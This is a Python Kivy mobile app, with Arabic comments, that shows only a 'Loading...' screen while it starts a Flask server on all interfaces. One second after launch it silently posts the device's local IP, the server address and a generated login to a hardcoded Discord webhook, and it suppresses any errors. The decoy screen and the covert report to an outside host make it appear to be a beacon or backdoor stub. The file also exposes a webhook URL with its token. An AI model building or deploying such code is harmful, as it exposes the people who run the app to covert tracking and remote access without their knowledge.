import kivy
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
import threading
import requests
import random
import string
import socket
from flask import Flask

# ==========================================
# ضع رابط الويب هوك (Webhook URL) الخاص بالديسكورد هنا
WEBHOOK_URL = "https://discord.com/api/webhooks/1551491653498437662/ZKV710LxZs-7Q9BxZldPVP3qfnFF1oUIOv3S2tNXAmsP4e4U0Y9e1n7DawPzGHjVmp4F"
# ==========================================

# إعدادات السيرفر
PORT = 5000
USERNAME = "admin"
# توليد باسورد عشوائي مكون من 6 حروف وأرقام
PASSWORD = ''.join(random.choices(string.ascii_letters + string.digits, k=6))

# تجهيز سيرفر Flask
app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    # هذه هي الصفحة التي ستظهر لك عندما تفتح الرابط من الكمبيوتر
    return f"""
    <h1 style='text-align:center; margin-top:50px; font-family:Arial;'>
        ✅ سيرفر الأندرويد يعمل بنجاح!<br>
        Username: {USERNAME}<br>
        Password: {PASSWORD}
    </h1>
    """

def run_flask_server():
    # تشغيل السيرفر في الخلفية
    app_flask.run(host='0.0.0.0', port=PORT)

class LoadingApp(App):
    def build(self):
        # واجهة التطبيق: شاشة سوداء مكتوب عليها Loading... فقط (بدون أي أزرار)
        return Label(
            text="Loading...", 
            font_size='35sp', 
            bold=True
        )

    def on_start(self):
        # بمجرد أن يفتح التطبيق، نقوم بتشغيل السيرفر في Thread منفصل
        threading.Thread(target=run_flask_server, daemon=True).start()
        
        # ونعطي التطبيق ثانية واحدة لكي يحمل، ثم نرسل البيانات للديسكورد
        Clock.schedule_once(self.send_to_discord, 1)

    def get_local_ip(self):
        # دالة لمعرفة الـ IP الخاص بالموبايل
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def send_to_discord(self, dt):
        local_ip = self.get_local_ip()
        server_link = f"http://{local_ip}:{PORT}"
        
        # تجهيز الرسالة التي ستصلك على ديسكورد
        payload = {
            "content": "📱 **تطبيق الموبايل قيد التشغيل الآن!**",
            "embeds": [{
                "title": "بيانات الدخول للسيرفر",
                "color": 3447003,
                "fields": [
                    {"name": "الرابط المتاح (على نفس الواي فاي)", "value": f"`{server_link}`", "inline": False},
                    {"name": "Username", "value": f"`{USERNAME}`", "inline": True},
                    {"name": "Password", "value": f"`{PASSWORD}`", "inline": True}
                ]
            }]
        }
        
        # إرسال الرسالة بصمت في الخلفية
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except Exception:
            pass # في حالة عدم وجود إنترنت، لا تظهر أخطاء وتظل الشاشة Loading...

if __name__ == "__main__":
    LoadingApp().run()
